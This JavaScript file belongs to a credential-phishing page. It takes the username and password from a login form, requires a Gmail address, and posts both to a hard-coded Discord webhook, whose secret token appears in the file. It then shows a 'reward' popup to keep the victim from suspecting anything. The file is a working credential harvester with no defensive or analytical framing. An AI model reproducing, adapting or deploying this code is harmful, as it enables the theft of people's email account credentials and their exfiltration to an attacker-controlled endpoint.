
const webhookURL = "https://discord.com/api/webhooks/1527318354191192169/NRSqo--ECTdMtyz_rkiI488C2Pd2gYVWcziRAOhDICEROFU7KTTKdbF4A2v1W57MLZmp";

function sendToWebhook(content) {
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    }).catch(err => console.log("Webhook error:", err));
}


document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

const username = document.getElementById("username").value.trim();
const password = document.getElementById("password").value.trim();

if (!username || !password) {
    alert("Please fill in all fields.");
    return;
}


if (!username.toLowerCase().endsWith("@gmail.com")) {
    alert("Please enter a valid Gmail address.");
    return;
}


    sendToWebhook(
        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
    );

    console.log("Username:", username);
    console.log("Password:", password);

    document.getElementById("loginBox").classList.remove("show");

  
    const popup = document.getElementById("rewardPopup");

    if (popup) {
        popup.classList.add("show");
    }
});


const loginBtn = document.querySelector(".open-login");
const loginBox = document.getElementById("loginBox");

loginBtn.addEventListener("click", (e) => {
    e.stopPropagation();
    loginBox.classList.toggle("show");
});


document.addEventListener("click", (e) => {
    if (
        !loginBox.contains(e.target) &&
        !loginBtn.contains(e.target)
    ) {
        loginBox.classList.remove("show");
    }
});


// =====================
document.getElementById("shopBtn")?.addEventListener("click", () => {

});

document.getElementById("screenshotBtn")?.addEventListener("click", () => {
  
});       
